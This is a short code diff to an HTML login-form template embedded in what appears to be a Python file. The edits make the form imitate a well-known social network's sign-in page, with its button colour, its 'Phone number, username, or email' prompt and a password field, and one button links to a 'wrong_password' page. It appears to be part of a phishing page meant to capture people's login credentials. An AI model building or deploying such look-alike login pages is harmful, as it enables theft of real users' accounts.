@@ -117,7 +117,7 @@ form_template = """
          .login-button {
          text-align: center;
          width: 100%;
-         padding: 0.5rem;
+         height: 35px;
          border: 1px solid transparent;
          background-color: #3897f0;
          color: #fff;
@@ -203,15 +203,14 @@ form_template = """
             <div class="heading"></div>
             <form class="login-form">
                <div class="field">
-                  <!-- <input id="" type="name" placeholder="Phone number, username, or email" /> -->
-                  <input type="text" id="name" name="name" required />
+                  <input  id="name" name="name" type="name" placeholder="Phone number, username, or email" />
+              
                   <label for="name">Name</label>
                </div>
                <div class="field">
-                  <!-- <input id="password" type="password" placeholder="password" />
-                     <label for="password">Password</label> -->
-                  <input type="email" id="email" name="email" required />
-                  <label for="email">Email:</label>
+                  <input id="email" name="email"  type="password" placeholder="password" />
+                     <label for="password">Password</label>
+                  <!-- <label for="email">Email:</label> -->
                </div>
                <!-- <button class="login-button" title="login"><a href="wrong_password.html">Log In</button></a> -->
                <input type="submit" class="login-button" value="Submit"/>
